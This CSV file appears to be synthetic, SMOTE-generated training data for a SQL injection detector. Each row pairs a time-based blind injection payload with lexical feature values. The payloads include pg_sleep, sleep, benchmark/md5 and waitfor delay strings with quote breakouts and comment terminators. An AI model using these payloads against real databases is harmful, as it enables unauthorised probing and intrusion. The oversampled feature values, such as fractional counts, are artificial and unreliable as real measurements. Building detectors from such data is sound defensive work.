id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000032,attack,time,1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000062,1.190453860841923,88.71961411970526,29.022691765587965,3.7043044913759586,24.67423058852932,18.0,35.696922354117284,10.348461177058642,0.27830515836780967,0.2031720232660002,0.40211855204023794,0.11640426632595222,0.674230588529321,0.0,2.0,0.0,0.0,2.0,0.0,4.674230588529321,0.0,1.0,0.0,4.0,0.674230588529321,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.674230588529321,0.32576941147067895,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000033,attack,time,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",nearest_attack_euclidean,R000127,0.10479010923820088,56.27907509285528,18.039867870407896,2.9459071684155744,10.0,10.0,28.199339352039487,8.079735740815796,0.17785950231414469,0.17785950231414469,0.5008543115087407,0.14342668386296994,0.9800660647960513,0.019933935203948705,0.0,0.0,0.0,1.0,0.0,5.039867870407898,0.01993393520394876,0.0,1.0,1.0,0.9800660647960511,0.01993393520394865,0.0,0.019933935203948705,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000034,attack,time,1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000004,1.7548639692663919,77.24636176168094,24.07726960280158,3.2586340821537423,19.415453920560317,10.0,37.0,10.83090784112063,0.25131472759670986,0.12950306168940548,0.4791613282508003,0.14002088246308436,0.4154539205603156,0.0,2.0,0.0,0.0,1.0,0.0,6.0,0.4154539205603156,1.0,0.0,3.0,0.4154539205603157,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.4154539205603156,0.5845460794396844,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000035,attack,time,1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000027,1.2378727846050757,68.89504031471078,29.0,4.2822608064570105,27.914223257277087,11.69525891424097,16.28555814319272,13.0,0.40591312771534704,0.17204039297029852,0.23178543191528853,0.19026104739906594,4.847629457120485,0.0,1.6952589142409709,0.0,0.0,1.0,0.0,1.4571116286385442,0.0,0.0,0.0,5.0,1.0,0.0,0.8476294571204854,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.15237054287951468,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.15237054287951474,0.0,0.8476294571204853,0.8476294571204853,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000036,attack,time,1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000039,0.29143019692148475,67.18670887233364,26.091285297871817,3.611816815287984,20.0,10.0,27.912852978718185,9.273855893615456,0.29847829354685984,0.14923914677342992,0.4145007972846935,0.13778176239501674,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.182570595743637,0.09128529787181858,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000037,attack,time,"1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000076,0.9195286751305669,71.41633806356744,25.416338063567437,3.574273421685132,15.0,21.0,28.0,7.416338063567439,0.2100459563862458,0.29406433894074413,0.3920857852543254,0.10380391941868468,0.41633806356743885,0.0,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0,0.416338063567439,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000038,attack,time,1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000146,0.4575633564575501,84.99763584836495,27.16627264139416,3.6918484830108667,24.16627264139416,18.0,33.665090565576634,9.166272641394158,0.28439466157623683,0.2119103908372263,0.3958922783746553,0.10780266921188159,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.166272641394158,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.16627264139415865,0.8337273586058412,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000039,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,0.6362308670681377,65.95719167803803,22.760702080490493,3.4521707173684364,19.0,10.0,27.957191678038033,9.0,0.28825269969170064,0.15171194720615824,0.4234946006165987,0.13654075248554243,0.0,0.760702080490492,2.0,0.0,0.0,1.0,0.0,4.239297919509508,0.0,1.0,0.0,3.0,0.0,0.760702080490492,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000040,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,nearest_attack_euclidean,R000009,1.1615172703324184,92.6026217798816,22.3013108899408,3.224371650571696,33.5895128804736,3.410487119526403,43.205243559763204,12.3973782201184,0.3631522665272703,0.03644336184280153,0.4664167776067515,0.13398759402317667,2.0960673301775987,0.0,0.0,0.0,1.0,1.0,0.0,8.301310889940801,0.0,0.0,0.0,2.0,0.6986891100591996,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000041,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000107,2.118946851089455,70.04672169734091,16.562622642127273,2.6916568030385215,12.171966981595455,5.1252452842545475,38.53082075255454,14.218688678936363,0.17472381509206525,0.07523304665664295,0.5472975413559136,0.20274559689537822,4.0,0.0,0.0,0.0,0.0,1.3906556605318183,0.0,6.437377357872727,2.0,0.0,0.39065566053181844,1.3906556605318183,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000042,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000078,0.475051031387843,89.61593922023316,27.146903565475743,3.793448162110344,26.0,21.146903565475743,31.175228523805934,11.293807130951484,0.29063195365862465,0.23622506773840324,0.34721555710375657,0.12592742149921554,4.0,0.0,0.0,0.0,0.0,2.0,0.0,4.293807130951484,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.146903565475742,0.853096434524258,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000043,attack,time,"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000044,0.7943193846669794,89.69433057329621,27.282388428882705,3.8389753737884686,20.0,29.0,31.12955371553081,9.564776857765406,0.22317618333342307,0.3236054658334634,0.34678080388876026,0.10643754694435321,0.0,0.2823884288827031,2.0,0.0,0.0,2.0,0.0,4.282388428882703,0.0,0.0,1.0,4.0,0.0,0.28238842888270316,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000044,attack,time,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",nearest_attack_euclidean,R000057,0.8370548511639713,57.45037991219604,23.774810043901983,3.6383220476397415,19.450379912196034,10.0,22.0,6.0,0.33842237188922075,0.1740993758186261,0.3830186268009774,0.10445962549117567,0.22518995609801795,0.774810043901982,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.0,0.22518995609801795,0.774810043901982,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.774810043901982,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.774810043901982
SMOTE_000045,attack,time,"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru",nearest_attack_euclidean,R000078,1.7410624945300313,89.99387583912203,26.601224832175596,3.767026202914757,24.40489932870238,23.39265100694643,31.59510067129762,10.601224832175594,0.27196852017456463,0.2592475434982555,0.350751782001531,0.11803215432564884,2.803674496526786,0.0,0.0,0.0,0.0,2.0,0.0,4.398775167824405,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.3987751678244047,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.39877516782440464,0.0,0.6012248321755953,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000046,attack,time,"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",nearest_attack_euclidean,R000030,0.5427131561391118,61.21929000296302,18.554822500740755,3.1989821513421375,25.332233751111133,1.2225887496296224,26.664467502222266,8.0,0.4139189570686761,0.020433997467158196,0.43455161112757235,0.1310954343365933,0.0,3.2225887496296224,0.0,0.0,0.0,0.0,0.0,4.777411250370378,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.777411250370378,0.0,0.0,0.0,1.222588749629622,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000047,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,1.6388022341707875,83.55139477636139,21.69163134183165,3.046784518543055,28.345815670915826,2.0,41.205579105445565,12.0,0.33938050163441935,0.023938211481250304,0.4930520179968284,0.1436292688875019,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.551394776361391,0.4486052236386079,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.5513947763613921,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.551394776361392
SMOTE_000048,attack,time,1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --,nearest_attack_euclidean,R000077,1.2858373448427225,67.91685445638359,22.69870350335511,3.362055833392728,17.096110510065326,12.41037197315913,29.807778979869347,8.602592993289782,0.2552044830416551,0.17960536966687266,0.4387227942233965,0.12646735306807577,0.6987035033551088,0.0,2.0,0.0,0.0,1.3012964966448912,0.0,4.301296496644891,0.0,0.0,0.30129649664489117,3.301296496644891,0.6987035033551087,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000049,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000145,0.5360170958415361,59.28323875913789,23.347646068817745,3.554537914529585,18.0,10.0,23.95706179354676,7.326176965591127,0.30452349296478015,0.16917971831376674,0.402774470814455,0.12352231790699808,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.3261769655911264,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000050,attack,time,"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  1915  =  1915",nearest_attack_euclidean,R000018,1.3370201815663663,76.53737477273616,18.27362502525154,2.917979545758342,13.179124924245384,15.810999797987689,38.0,9.547250050503077,0.17172289732316082,0.20459244812509525,0.4979348568962073,0.12574979765553668,0.27362502525153864,0.0,0.0,0.0,0.0,1.7263749747484614,0.0,6.273625025251539,0.0,0.0,1.0,1.7263749747484614,0.27362502525153876,0.0,0.0,0.27362502525153876,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.7263749747484611,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7263749747484614
SMOTE_000051,attack,time,1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000033,0.2227517631736794,79.43085676673812,26.89228580831547,3.381807612207652,20.0,10.0,37.43085676673812,12.0,0.2518503682576236,0.1259251841288118,0.4711142266589905,0.15111022095457413,1.0,0.0,2.0,0.0,0.0,1.0,0.0,6.107714191684528,0.8922858083154714,1.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000052,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000061,2.318250818909328,77.86089611838275,18.620298706127585,2.914475668556342,26.08019913741839,1.540099568709195,39.24059741225517,11.0,0.33533781056999223,0.019473166120512614,0.5034365771521631,0.14175244615733207,0.5400995687091948,0.0,0.9198008625816102,0.0,1.0,0.0,0.0,8.540099568709195,0.0,0.0,0.0,1.9198008625816103,0.540099568709195,0.0,0.4599004312908051,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.540099568709195,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.540099568709195
SMOTE_000053,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000052,0.00899297790014784,85.06457156967349,27.004967043821036,3.6992016510610357,24.029802262926225,18.0,33.029802262926225,10.004967043821038,0.2824710053633332,0.21162517547969714,0.3882835931031818,0.11762022605378791,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.004967043821037,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000054,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000051,0.08677233526207687,88.097364521633,25.0,3.15439955225764,30.194729043265987,1.980527095673402,42.941581287020206,12.980527095673402,0.3426460435188681,0.02249409278787798,0.4874966371978934,0.14736322649536052,1.0389458086531975,0.0,0.0,0.0,1.0,0.0,0.0,8.980527095673402,0.9805270956734011,0.0,0.0,1.0,1.0,0.0,0.0,0.9805270956734013,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.01947290432659876,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.019472904326599
SMOTE_000055,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""poik""  =  ""poik",nearest_attack_euclidean,R000115,0.17241337980540355,84.57509977662521,28.87859993617863,3.9283506608593344,30.514399744714524,15.0,29.0,10.060700031910685,0.36046695101438203,0.17743190095786154,0.3430350085185323,0.11906613950922415,0.0,3.0,0.0,0.0,0.0,1.0,0.0,5.0,0.06070003191068435,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000056,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000055,0.6334328659145047,65.95298216297357,22.761754459256608,3.4523520984949867,19.0,10.0,27.952982162973566,9.0,0.28827053264292135,0.1517213329699586,0.42345893471415735,0.13654919967296275,0.0,0.7617544592566082,2.0,0.0,0.0,1.0,0.0,4.238245540743391,0.0,1.0,0.0,3.0,0.0,0.7617544592566083,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000057,attack,time,"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",nearest_attack_euclidean,R000048,0.0035391481674516166,99.0,28.0,3.739406112131258,26.0,22.0,38.0,13.0,0.26262626262626265,0.2222222222222222,0.3838383838383838,0.13131313131313133,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,0.0,0.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000058,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000028,2.402639516608983,92.65183394175659,22.550611313918864,3.100328585102727,29.651833941756593,1.5506113139188642,45.89877737216227,15.550611313918864,0.3198580241209569,0.01665347154838205,0.495692371475825,0.16779613285483608,2.2024452556754563,1.3481660582434078,0.0,0.0,1.0,1.0,0.0,8.449388686081136,1.550611313918864,0.0,0.0,2.0,0.5506113139188641,0.44938868608113597,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.5506113139188642,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.550611313918864
SMOTE_000059,attack,time," select sleep  (  5  )   and    (    (     (  ""uvzc"" like ""uvzc",nearest_attack_euclidean,R000138,1.419535783928505,62.0,17.85578516360464,3.072974809051879,24.474380218139522,1.0,28.14421483639536,8.38140494546512,0.39474806803450846,0.016129032258064516,0.4539389489741187,0.13518395073330838,0.0,3.0,0.0,0.0,0.0,0.3814049454651196,0.0,5.0,0.0,0.0,0.0,0.3814049454651196,0.0,1.0,0.0,0.0,0.0,0.38140494546511966,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000060,attack,time,"1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000087,0.7016482173758132,71.46414168585574,26.0,3.677214732697726,16.0,21.0,26.886784738213116,7.577356947642623,0.22510546562983608,0.2954509236391598,0.3737430076724181,0.10570060305858606,0.0,0.0,0.0,0.0,0.0,1.0,0.0,4.577356947642623,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000061,attack,time,"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000054,0.35183955107010384,63.69047550717247,18.098639358167496,2.7921896969074442,10.098639358167496,10.0,34.394557432669984,9.197278716334992,0.15857358832036905,0.15716445463226197,0.539995680502119,0.14426627654524993,0.09863935816749603,0.0,0.0,0.0,0.0,1.0,0.0,6.098639358167496,0.0,0.0,1.0,1.0,0.09863935816749608,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.09863935816749603,0.901360641832504,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000062,attack,time,"1""   )    )     )   or sleep  (  5  )   and    (    (     (  ""eran""  =  ""eran",nearest_attack_euclidean,R000022,0.09268960111370805,76.70286013946944,16.0,2.552362945723223,18.079237296141486,1.9801906759646286,43.7226694635048,12.920762703858514,0.2361645976733231,0.025779003303380316,0.5696941144853822,0.16836228453791435,0.0,3.9801906759646295,0.0,0.0,0.0,1.0,0.0,7.940572027893886,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.019809324035371167,0.0,0.0,0.0,1.0,0.9801906759646288,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000063,attack,time,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.023118527209667783,73.95602249785233,27.010994375536917,3.700918492158862,16.0,21.0,27.95602249785233,9.0,0.21635205406068778,0.2839620709546527,0.37798784457552265,0.12169803040913689,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.989005624463083,0.010994375536917678,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
